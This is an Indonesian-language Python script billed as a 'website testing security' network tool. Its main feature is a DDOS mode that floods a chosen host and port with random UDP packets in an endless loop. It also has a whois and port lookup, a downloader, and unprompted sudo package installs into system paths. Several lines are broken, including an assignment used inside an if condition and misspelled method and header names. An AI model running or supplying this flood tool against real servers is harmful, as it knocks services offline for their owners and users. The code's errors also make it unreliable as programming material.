# main.py
#
# Copyright 2024 Programmer
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# SPDX-License-Identifier: GPL-3.0-or-later

#-----------------------------------------------------------------------#

#Color
import socket, sys, os, time, optparse
if sys.platform in ["linux", "linux2"]:
    orange = "\033[93m"
    putih = "\033[39m"
    merah = "\033[91m"
    hijau = "\033[92m"
    biru = "\033[94m"
    borange = "\033[1;93m"
    bputih = "\033[1;39m"
    bmerah = "\033[1;91m"
    bhijau = "\033[1;92m"
    bbiru = "\033[1;94m"
    reset = '\033[0m'
else:
    orange = ""
    putih = ""
    merah = ""
    hijau = ""
    biru = ""
    borange = ""
    bputih = ""
    bmerah = ""
    bhijau = ""
    bbiru = ""
    reset = ''
#START
try:
    import requests
except ImportError:
    print(merah+' [<] Mengunduh python3-requests...');time.sleep(0.3)
    if sys.platform in ['linux', 'linux2']:
        os.system('sudo apt update')
        os.system('sudo apt install python3-requests')
    else:
        os.system('pip install requests')

baner = borange+'''
 <>====================================================<>
  |'''+bputih+'''                    Network Tools                   '''+borange+'''|
  |          '''+bhijau+''' Website Testing Security Tools      '''+borange+'''     |
 <>====================================================<>
  | '''+bmerah+'''=> '''+bputih+''' Author: Sreetx               '''+borange+'''                  |
  | '''+bmerah+'''=> '''+bputih+'''Github: https://github.com/Sreetx    '''+borange+'''           |
  | '''+bmerah+'''=> '''+bputih+'''Youtube: https://youtube.com/@linggachannel4781 '''+borange+'''|
 <>====================================================<>'''+reset

def ddoss(url, port, paket, timeout):
        import socket, random, string
        print (baner)
        print(' <>====================================================<>')
        print('  | => Mode: DDOS                                      |')
        print('  | => Target Uji coba: '+str(url)+'                   |')
        print('  | => Port: '+str(port)+'                                       |')
        print('  | => Time Out: '+str(timeout)+'                                  |')
        print('  +====================================================+')
        print('  | => Kami tidak bertanggung jawab atas keslahan yg   |')
        print('  |    telah anda lakukan                              |')
        print(' <>====================================================<>')
        def startdos():
            try:
                ip = socket.gethostbyname(str(url))
                ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(5000 + int(paket))
                sent = int(paket)
                ddos.sendto(bytes, (ip, int(port)))
                sent = sent + 1
            except KeyboardInterrupt: print(merah+'\n [!] Pengujian dihentikan\n'+reset);time.sleep(1);sys.exit()
        try:
            print(merah+'\n [!] Pengujian Dilakukan. CTRL+C untuk keluar')
            while True:
                startdos()
        except KeyboardInterrupt: print(merah+'\n [!] Pengujian dihentikan\n'+reset);time.sleep(0.8);sys.exit()
        except socket.gaierror: print(merah+'\n [!] Tidak ada koneksi internet');sys.exit()


def ipconfigs(url, port):
    try:
         import socket, whois
    except ImportError:
         print(merah+' [<] Mengunduh python3-whois...'+reset)
         if sys.platform in ['linux', 'linux2']:
             mdl = requests.get('https://files.pythonhosted.org/packages/4c/3d/39cf14b4be3a931b1a77ae30b57ecdc11307d08b9e9586fda287ccd47aa1/python-whois-0.8.0.tar.gz')
             if mdl.status_code = 200:
                 with open('whois.tar.gz', 'wb') as who_is:
                     who_is.write(mdl.content)
                 os.system('sudo tar -xzf whois.tar.gz')
                 os.system('sudo mv whois /lib/python3.11/')
                 os.system('sudo rm -r whois')
                 os.system('sudo apt install python3-future');sys.exit()
             else: pass
         else:
             os.system('pip install whois');sys.exit()


    try:
        w = whois.whois(url)
        provider = w.registrar
        konek = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(borange+' <>====================================================<>')
        print(bhijau+' [~] Mencari Informasi...'+reset);time.sleep(0.3)
        sd = socket.gethostbyname(str(url))
        prt = konek.connect_ex((str(sd), int(port)))
        print(bhijau+'[✔️] Mendapatkan informasi'+reset)
        print(bhijau+' [>] Host URL: '+bmerah+url)
        print(bhijau+' [>] IP: '+bmerah+sd)
        if prt == 0:
            print(bhijau+' [>] Port terbuka pada: '+bmerah+port+reset)
        else:
            print(bmerah+' [<] Port tidak terbuka pada: '+bmerah+reset)
        print(bhijau+' [>] Alamat Penghosting: '+provider)
        print(hijau+' [-] Alamat Web: '+bbiru+'https://'+url+'/')
        print(borange+' <>====================================================<>'+reset);sys.exit()
    except socket.gaierror: print(merah+' [!] Periksa koneksi internet atau alamat web');sys.exit()

def downloadss(url, mode):
    try:
        import requests
        import zipfile
        from tqdm import tqdm
    except ImportError:
        print(merah+' [<] Mengunduh python3-tqdm...'+reset)
        if sys.platform in ['linux', 'linux2']:
            os.system('sudo apt update')
            os.system('sudo apt install python3-tqdm');sys.exit()
        else:
            os.system('pip install tqdm');sys.exit()
    try:
        print(borange+' <>====================================================<>')
        print(hijau+'\n [~] Sedang Menyiapkan...');time.sleep(0.3)
        if mode == 'web':
            name = url.split('/')[-1]
            s = input(merah+' [?] Unduh file ini? file ini mungkin akan merusak perangkat anda [y/n]'+reset)
            if s == 'n':
                 sys.exit()
            r = requests.get(str(url), stream=True)
            ukuran = int(r.headers.get('content_lenght', 0))
            print(hijau+' [~] Downloading...'+reset)
            with open(str(name), 'wb') as file, tqdm(desc=' [~] '+name, total=ukuran, unit='b', unit_scale=True, unit_divisor=1024) as progres:
                for data in r.iter_content(chunk_size=1024):
                    size = file.write(data)
                    progres.update(size)
            print(bmerah+' [✔️] Selesai')
            print(bmerah+' [✔️] File Disimpan di folder tools ini dengan nama '+biru+name+reset)
            print(borange+' <>====================================================<>');sys.exit()
        if mode == 'github':
            print(bhijau+' [~] Menyiapkan File...');time.sleep(0.3)
            git = url.split('/')[-1]
            print(bhijau+' [>] File yg akan diunduh: '+bbiru+git)
            s1 = input(merah+' [?] Unduh file ini? file ini mungkin akan merusak perangkat anda [y/n]'+reset)
            if s1 == 'n':
                sys.exit()
            def menuus(menuz):
                r1 = requests.get(str(url+'/archive/refs/heads/'+menuz), stream=True)
                totall = int(r1.headers.get('content-lenght', 0))
                with open(git+'.zip', 'wb') as ttd, tqdm(desc=bhijau+' [>] Mengunduh file: '+bbiru+git, total=totall, unit='B', unit_scale=True, unit_divisor=1024) as barr:
                    for buildin in r1.iter_content(chunk_size=1024):
                        buildd = ttd.write(buildin)
                        barr.update(buildd)
                print(merah+' [>] Mengkestrak file...')
                ls = git+'.zip'
                exs = zipfile.ZipFile(ls)
                exs.exctractall(git+'.zip', pwd=False)
                os.system('rm -f'+git+'.zip')
                print(hijau+' [✔️] Selesai')
                print(borange+' <>====================================================<>'+reset);sys.exit()
            gits = requests.head(url+'/archive/refs/heads/master.zip')
            if gits.status_code == requests.codes.ok:
                menuz = 'master.zip'
                menuus(menuz)
            else:
                menuz = 'main.zip'
                menuus(menuz)
    except requests.exceptions.ConnectionError: print(merah+' [!] Periksa koneksi internet atau link anda'+reset);sys.exit()
    except KeyboardInterrupt: print(merah+' [!] Keluar dari program'+reset);time.sleep(0.3);sys.exit()

def bantuan():

    baner = borange+'''
 <>====================================================<>
  |'''+bputih+'''                    Network Tools                   '''+borange+'''|
  |          '''+bhijau+''' Website Testing Security Tools      '''+borange+'''     |
 <>====================================================<>
  | '''+bmerah+'''=> '''+bputih+''' Author: Sreetx               '''+borange+'''                  |
  | '''+bmerah+'''=> '''+bputih+'''Github: https://github.com/Sreetx    '''+borange+'''           |
  | '''+bmerah+'''=> '''+bputih+'''Youtube: https://youtube.com/@linggachannel4781 '''+borange+'''|
 <>====================================================<>'''+reset
    print (baner)
    print('  | => Starting                                        |')
    print('  | => Kami tidak bertanggung jawab atas keslahan yg   |')
    print('  |    telah anda lakukan                              |')
    print(' <>====================================================<>')
    bantuan = '''
> Command:
    --ddos          Digunakan untuk masuk ke opsi DDOS
    --url           Digunakan untuk memasukkan host url
    --paket         Digunakan untuk memasukkan ukuran paket yang akan digunakan untuk ddos
    --timeout       Digunakan untuk mengatur timeout ddos
    --mode          Digunakan untuk memilih opsi unduh [GitHub/Website]
    --downloads     Digunakan untuk masuk ke mode ddos
    --ipconfig      Digunakan untuk melihat informasi website seperti IP, dll
    --port          Digunakan untuk memasukkan port pada opsi ddos atau ipconfig
> Usage:
    python3 main.py --donwloads --mode=github --url https://tytyd.com
    python3 main.py --ddos --url web.com --port 80 --paket 100
    python3 main.py --ipconfig --url web.com --port 443'''
    print(bantuan)

menu = optparse.OptionParser(bantuan())
menu.add_option('--url', dest='url')
menu.add_option('--port', dest='port')
menu.add_option('--paket', dest='paket')
menu.add_option('--timeout', dest='timeout')
menu.add_option('--mode', dest='mode')
menu.add_option('--ddos', dest='ddos', action='store_true', default=False)
menu.add_option('--downloads', dest='downloads', action='store_true', default=False)
menu.add_option('--ipconfig', dest='ipconfig', action='store_true', default=False)

(option, args) = menu.parse_args()
url = option.url
port = option.port
paket = option.paket
timeout = option.timeout
mode = option.mode
ddos = option.ddos
downloads = option.downloads
ipconfig = option.ipconfig

if ddos:
    ddoss(url, port, paket, timeout)
if ipconfig:
    ipconfigs(url, port)
if downloads:
    downloadss(url, mode)
